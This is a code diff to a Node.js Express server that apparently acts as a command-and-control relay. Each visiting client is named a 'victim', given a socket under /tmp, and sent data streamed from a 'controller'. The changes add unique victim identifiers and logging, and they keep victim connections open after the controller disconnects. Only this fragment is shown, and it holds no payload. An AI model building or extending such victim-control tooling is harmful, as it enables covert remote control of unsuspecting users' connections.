@@ -3,6 +3,7 @@ const fs = require('fs');
 const https = require('https');
 const http = require('http');
 const net = require('net');
+const uuid = require('uuid');
 
 const options = {
   // key: fs.readFileSync("./key.pem"),
@@ -12,7 +13,9 @@ const options = {
 const app = express();
 
 app.get('/', (req, res) => {
-  const fileName = `/tmp/victim-${req.socket.remoteAddress.replace(/[.:]/g, '-')}.sock`;
+  const victimName = `${req.socket.remoteAddress.replace(/[.:]/g, '-')}-${uuid.v4()}`;
+  console.log(`New victim in the system ${victimName}`);
+  const fileName = `/tmp/victim-${victimName}.sock`;
   try {
     // delete socket in case it's still there
     fs.unlinkSync(fileName);
@@ -21,6 +24,7 @@ app.get('/', (req, res) => {
   let controllerStream;
 
   var server = net.createServer(stream => {
+    console.log('Controlled started the stream');
     controllerStream = stream;
     stream.on('data', c => {
       console.log('Controller -> Victim:', c.toString());
@@ -28,8 +32,6 @@ app.get('/', (req, res) => {
     });
     stream.on('end', () => {
       console.log('Controller ended the stream');
-      server.close();
-      res.end();
       controllerStream = null;
     });
   });
